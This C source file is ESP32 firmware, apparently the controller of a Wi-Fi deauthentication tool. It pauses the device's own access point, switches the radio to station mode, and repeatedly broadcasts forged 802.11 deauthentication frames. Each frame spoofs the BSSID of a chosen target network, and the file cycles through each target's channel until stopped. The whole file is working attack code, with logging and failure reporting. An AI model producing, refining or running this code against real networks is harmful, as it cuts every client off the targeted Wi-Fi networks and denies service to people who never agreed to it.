/* Port of the supplied controller; one cooperative task owns all transmissions. */
#include "controller.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_rom_sys.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include <stdatomic.h>
#include <string.h>

static wifi_ap_record_t selected[MAX_JOB_TARGETS];
static unsigned target_count;
static atomic_bool running;
static SemaphoreHandle_t stopped;
static uint32_t active_job;
/* Only the shared manager starts/stops the session. Disable SoftAP for the
 * whole job so the phone cannot reconnect between channel changes. */
static bool radio_reserved;
static const char *TAG = "controller";
static atomic_bool observe_tx;
static atomic_uint tx_done_ok, tx_done_fail;
static bool callback_registered;
static esp_err_t callback_error;

/* The SDK invokes this in its Wi-Fi task. Keep it bounded, without logging,
 * mutexes, job access or retaining the SDK's temporary pointers. These are
 * driver results; broadcast frames cannot acknowledge receipt by a client. */
static void tx_done(const esp_80211_tx_info_t *info) {
    if (!atomic_load(&observe_tx) || !info || !info->data || info->data_len < 2 ||
        info->ifidx != WIFI_IF_STA || info->data[0] != 0xc0) return;
    if (info->tx_status == WIFI_SEND_SUCCESS) atomic_fetch_add(&tx_done_ok, 1);
    else atomic_fetch_add(&tx_done_fail, 1);
}

static void transmit_task(void *arg) {
    const uint32_t id = active_job;
    esp_err_t failure = ESP_OK;
    const char *stage = NULL;
    unsigned failed_target = 0;
    /* Let the HTTP task send the accepted job identity before taking down its
     * network interface. Stop/timeout can cancel during this short handoff. */
    vTaskDelay(pdMS_TO_TICKS(150));
    if (!atomic_load(&running)) goto done;
    /* APSTA with a connected ManagementAP client cannot set_channel(). A full
     * stop also clears a previous scan/STA association before taking the radio.
     * Keep SoftAP off until the manager ends this bounded operation. */
    radio_reserved = true;
    stage = "radio_stop"; failure = esp_wifi_stop();
    if (failure == ESP_OK) {
        /* Reset only after the previous radio session has stopped. */
        atomic_store(&tx_done_ok, 0); atomic_store(&tx_done_fail, 0);
        callback_error = esp_wifi_register_80211_tx_cb(tx_done);
        callback_registered = callback_error == ESP_OK;
        atomic_store(&observe_tx, callback_registered);
        if (callback_error != ESP_OK)
            ESP_LOGW(TAG, "job=%lu TX completion diagnostics unavailable: %s (0x%x)",
                     (unsigned long)id, esp_err_to_name(callback_error), (unsigned)callback_error);
    }
    if (failure == ESP_OK) { stage = "mode"; failure = esp_wifi_set_mode(WIFI_MODE_STA); }
    if (failure == ESP_OK) { stage = "radio_start"; failure = esp_wifi_start(); }
    if (failure == ESP_OK) { stage = "promiscuous"; failure = esp_wifi_set_promiscuous(true); }
    if (failure != ESP_OK) goto done;
    ESP_LOGI(TAG, "job=%lu radio mode=STA; ManagementAP paused until job ends", (unsigned long)id);
    while (atomic_load(&running)) {
        for (unsigned i = 0; i < target_count && atomic_load(&running); ++i) {
            esp_err_t channel = esp_wifi_set_channel(selected[i].primary, WIFI_SECOND_CHAN_NONE);
            if (channel != ESP_OK) {
                failure = channel; stage = "channel"; failed_target = i; goto done;
            }
            uint8_t actual; wifi_second_chan_t secondary;
            channel = esp_wifi_get_channel(&actual, &secondary);
            if (channel != ESP_OK || actual != selected[i].primary) {
                failure = channel != ESP_OK ? channel : ESP_ERR_INVALID_STATE;
                stage = "channel_check"; failed_target = i; goto done;
            }
            uint8_t frame[26] = {0xc0};
            memset(frame + 4, 0xff, 6);
            memcpy(frame + 10, selected[i].bssid, 6); memcpy(frame + 16, selected[i].bssid, 6);
            frame[24] = 1;
            for (unsigned j = 0; j < 25 && atomic_load(&running); ++j) {
                esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
                if (err != ESP_OK) {
                    failure = err; stage = "transmit"; failed_target = i; goto done;
                }
                attack_note_tx(true, i);
                esp_rom_delay_us(1000);
            }
            vTaskDelay(1);
        }
    }
done:;
    esp_err_t notification = ESP_OK;
    if (failure != ESP_OK) {
        ESP_LOGE(TAG, "job=%lu target=%u stage=%s requested_channel=%u error=%s (0x%x); stopping",
                 (unsigned long)id, failed_target, stage, selected[failed_target].primary,
                 esp_err_to_name(failure), (unsigned)failure);
        /* Record before signaling the join so a concurrent Stop/timeout cannot
         * finish the job and discard the actual cause. Posting never blocks. */
        notification = attack_controller_failure_request(id, failure, stage, failed_target);
    }
    /* The manager may now join. No radio calls or target-array reads follow. */
    xSemaphoreGive(stopped);
    while (failure != ESP_OK && notification != ESP_OK && notification != ESP_ERR_INVALID_STATE && atomic_load(&running)) {
        esp_err_t err = attack_controller_failure_request(id, failure, stage, failed_target);
        if (err == ESP_OK || err == ESP_ERR_INVALID_STATE) break;
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    vTaskDelete(NULL);
}
esp_err_t controller_start(const wifi_ap_record_t *targets, unsigned count) {
    if (!targets || !count || count > MAX_JOB_TARGETS || atomic_load(&running)) return ESP_ERR_INVALID_ARG;
    if (!stopped) stopped = xSemaphoreCreateBinary();
    if (!stopped) return ESP_ERR_NO_MEM;
    xSemaphoreTake(stopped, 0);
    atomic_store(&observe_tx, false);
    atomic_store(&tx_done_ok, 0); atomic_store(&tx_done_fail, 0);
    callback_registered = false; callback_error = ESP_OK;
    memcpy(selected, targets, count * sizeof(*targets)); target_count = count;
    attack_lock(); active_job = attack_get_job()->id;
    ESP_LOGI(TAG, "session=%s job=%lu targets=%u interface=STA sequence=caller",
             attack_get_job()->boot_id, (unsigned long)active_job, count);
    attack_unlock();
    for (unsigned i = 0; i < count; ++i)
        ESP_LOGI(TAG, "target=%u bssid=%02x:%02x:%02x:%02x:%02x:%02x channel=%u",
                 i, selected[i].bssid[0], selected[i].bssid[1], selected[i].bssid[2],
                 selected[i].bssid[3], selected[i].bssid[4], selected[i].bssid[5], selected[i].primary);
    atomic_store(&running, true);
    if (xTaskCreate(transmit_task, "controller", 4096, NULL, 4, NULL) != pdPASS) {
        atomic_store(&running, false);
        ESP_LOGE(TAG, "job=%lu stage=task error=ESP_ERR_NO_MEM (0x%x)",
                 (unsigned long)active_job, ESP_ERR_NO_MEM);
        attack_controller_failure_request(active_job, ESP_ERR_NO_MEM, "task", 0);
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}
void controller_stop(void) {
    if (atomic_exchange(&running, false)) xSemaphoreTake(stopped, portMAX_DELAY);
    esp_wifi_set_promiscuous(false);
    if (radio_reserved) {
        /* The shared manager reapplies ManagementAP's channel/config/MAC after
         * this reset. Bring back APSTA on every exit, including failed starts. */
        radio_reserved = false;
        const char *stage = "restore_stop";
        esp_err_t err = esp_wifi_stop();
        /* Freeze diagnostic collection and detach before restoring ManagementAP.
         * A missing callback is unknown, not a transmission failure. */
        atomic_store(&observe_tx, false);
        if (callback_registered) {
            esp_err_t unregister_error = esp_wifi_register_80211_tx_cb(NULL);
            if (unregister_error != ESP_OK && callback_error == ESP_OK) callback_error = unregister_error;
        }
        if (err == ESP_OK) { stage = "restore_mode"; err = esp_wifi_set_mode(WIFI_MODE_APSTA); }
        if (err == ESP_OK) { stage = "restore_start"; err = esp_wifi_start(); }
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "job=%lu stage=%s error=%s (0x%x)",
                     (unsigned long)active_job, stage, esp_err_to_name(err), (unsigned)err);
            attack_controller_failure_request(active_job, err, stage, 0);
        } else ESP_LOGI(TAG, "job=%lu radio mode=APSTA restored", (unsigned long)active_job);
    }
    atomic_store(&observe_tx, false);
    uint32_t ok = atomic_load(&tx_done_ok), failed = atomic_load(&tx_done_fail);
    attack_controller_diagnostics(active_job, ok, failed, callback_registered, callback_error);
    ESP_LOGI(TAG, "job=%lu driver_completed_ok=%lu driver_completed_fail=%lu callback_registered=%d callback_error=%s; peer receipt unverified",
             (unsigned long)active_job, (unsigned long)ok, (unsigned long)failed,
             callback_registered, esp_err_to_name(callback_error));
}
